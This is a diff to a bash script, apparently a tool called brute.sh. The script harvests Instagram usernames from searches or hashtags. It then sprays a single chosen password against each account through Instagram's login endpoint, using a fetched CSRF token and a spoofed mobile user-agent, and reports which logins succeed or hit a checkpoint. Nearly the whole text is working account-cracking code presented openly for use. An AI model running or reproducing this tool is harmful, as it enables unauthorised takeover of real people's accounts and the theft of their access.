@@ -47,7 +47,7 @@ touch target
 case $opt in
     1) # menu 1
         read -p $'\e[37m[\e[34m?\e[37m] Search by query   : \e[1;33m' ask
-        collect=$(curl -s "https://www.instagram.com/web/search/topsearch/?context=blended&query=${ask}" | jq -r '.users[].user.username' > >
+        collect=$(curl -s "https://www.instagram.com/web/search/topsearch/?context=blended&query=${ask}" | jq -r '.users[].user.username' > target)
         echo $'\e[37m[\e[34m+\e[37m] Just found        : \e[1;33m'$collect''$(< target wc -l ; echo -e "${white}user")
         read -p $'[\e[1;34m?\e[1;37m] Password to use   : \e[1;33m' pass
         echo -e "${white}[${yellow}!${white}] ${red}Start cracking...${white}"
@@ -59,7 +59,7 @@ case $opt in
         echo -e "$hashtag : ${red}Hashtag not found${white}"
         exit
         else
-            echo "$get" | jq -r '.[].hashtag.edge_hashtag_to_media.edges[].node.shortcode' | awk '{print "https://www.instagram.com/p/"$0"/">
+            echo "$get" | jq -r '.[].hashtag.edge_hashtag_to_media.edges[].node.shortcode' | awk '{print "https://www.instagram.com/p/"$0"/"}' > result
             echo -e "${white}[${blue}!${white}] Removing duplicate user from tag ${red}#$hashtag${white}"$(sort -u result > hashtag)
             echo -e "[${blue}+${white}] Just found        : ${yellow}"$(< hashtag wc -l ; echo -e "${white}user")
             read -p $'[\e[34m?\e[37m] Password to use   : \e[1;33m' pass
@@ -81,14 +81,15 @@ case $opt in
                 echo -e "[${blue}+${white}] Total your list   : ${yellow}"$(< target wc -l)
                 read -p $'[\e[34m?\e[37m] Password to use   : \e[1;33m' pass
                 echo -e "${white}[${yellow}!${white}] ${red}Start cracking...${white}"
-fi
+        fi
         ;;
     *) # wrong menu
         echo -e "${white}options are not on the menu"
         sleep 1
         clear
-        bash Run.sh
+        bash brute.sh
 esac
+
 # start_brute
 token=$(curl -sLi "https://www.instagram.com/accounts/login/ajax/" | grep -o "csrftoken=.*" | cut -d "=" -f2 | cut -d ";" -f1)
 function brute(){
@@ -96,18 +97,18 @@ function brute(){
                     -H "cookie: csrftoken=${token}" \
                     -H "origin: https://www.instagram.com" \
                     -H "referer: https://www.instagram.com/accounts/login/" \
-                    -H "user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930T1 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko>
+                    -H "user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930T1 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36" \
                     -H "x-csrftoken: ${token}" \
                     -H "x-requested-with: XMLHttpRequest" \
                     -d "username=${i}&password=${pass}")
                     login=$(echo $url | grep -o "authenticated.*" | cut -d ":" -f2 | cut -d "," -f1)
                     if [[ $login =~ "true" ]]; then
-                            echo -e "[${green}+${white}] ${yellow}You get it! ${blue}[${white}@$i - $pass${blue}] ${white}- with: "$(curl -s>
+                            echo -e "[${green}+${white}] ${yellow}You get it! ${blue}[${white}@$i - $pass${blue}] ${white}- with: "$(curl -sXGET "https://instagram.com/${i}/" -L | grep -o '<meta property="og:description" content=".*' | cut -d '"' -f4 | cut -d " " -f1)
                         elif [[ $login =~ "false" ]]; then
                                     echo -e "[${red}!${white}] @$i - ${red}failed to crack${white}"
                             elif [[ $url =~ "checkpoint_required" ]]; then
                                     echo -e "[${cyan}?${white}] @$i ${white}: ${green}checkpoint${white}"
-              fi
+                    fi
 }
 
 # thread
@@ -120,3 +121,8 @@ function brute(){
 )
 
 rm target
+
+            
+
+
+                    
